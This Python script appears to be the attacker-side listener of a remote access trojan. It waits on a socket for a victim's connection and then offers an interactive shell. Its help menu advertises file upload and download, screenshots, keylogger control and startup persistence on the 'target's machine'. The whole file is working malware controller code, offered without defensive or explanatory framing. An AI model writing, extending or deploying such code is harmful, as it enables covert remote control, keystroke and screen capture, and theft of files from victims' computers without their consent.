#! /usr/bin/env python3

import socket
from termcolor import colored
import json
import os
import datetime as dt


def send(data: str):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def recv() -> str:
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(filename):
    with open(filename, "rb") as f:
        data = f.read()
        f.close()
    target.send(data)


def download_file(filename):
    with open(filename, 'wb') as f:
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk != None:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
    target.settimeout(None)
    f.close()


def screenshot():
    download_file(f"screenshot{dt.datetime.now()}")


def target_communication():
    while True:
        command = input("* Shell~%s " % str(ip[0]))
        send(command)
        if command == "quit" or command == "exit":
            break
        elif command == "help":
            print(colored('''\tHelp Manual:\n
            quit                            --> Quit And Close Session With Target.
            clear                           --> Clear The Screen.
            cd *DIR*                        --> Change Directory On Target's System.
            upload *FILENAME*               --> Upload A File To The Target's Machine.
            download *FILENAME*             --> Download A File From The Target's Machine.
            screenshot                      --> Take A Screenshot Of Target's Machine.
            keylog_start                    --> Start The KeyLogger.
            keylog_dump                     --> Print Captured KeyStrokes And Clean DB.
            keylog_stop                     --> Stop And Destroy The KeyLogger File.
            startup *REGNAME* *FILENAME*    --> Make *FILENAME* Executed On Target's Machine StartUp.''', "yellow"))
        elif command == "clear":
            os.system('clear')
        elif command[:3] == "cd ":
            pass
        elif command[:6] == "upload":
            upload_file(command[7:])
        elif command[:8] == "download":
            download_file(command[9:])
            continue
        elif command == "screenshot":
            screenshot()
            continue
        result = recv()
        print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.168.1.109", 5555))
print(colored("[+] Waiting for connections...", "yellow"))
sock.listen(5)
target, ip = sock.accept()
print(colored(f"[+] connection from {ip[0]}.", "green"))
target_communication()
